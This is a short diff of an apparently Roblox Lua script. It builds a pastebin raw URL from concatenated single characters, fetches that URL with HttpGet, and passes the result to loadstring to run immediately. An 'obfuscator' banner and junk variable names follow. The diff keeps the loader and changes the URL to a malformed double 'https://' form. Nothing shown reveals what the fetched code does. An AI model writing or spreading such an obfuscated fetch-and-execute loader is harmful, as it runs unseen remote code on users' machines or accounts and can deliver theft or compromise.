@@ -17,12 +17,12 @@
 --]]
 
 local a = getfenv or function() return _ENV end
-local b = "h" .. "t" .. "t" .. "p" .. "s" .. "://" .. "pastebin.com/raw/cbBsFWLF"
+local b = "h" .. "t" .. "t" .. "p" .. "s" .. "://" .. "https://pastebin.com/raw/cbBsFWLF"
 local c = game["HttpGet"](game, b, true)
 local d = loadstring(c)
 d()
 task.wait(1)
--- SKIDS
+
 -- Protected by Premium Lua Obfuscator V2.0 - Universal Compatibility
 local trbqmjtxg = tostring(502)
 local pgpwxbww = 'Bailey your looking great today'
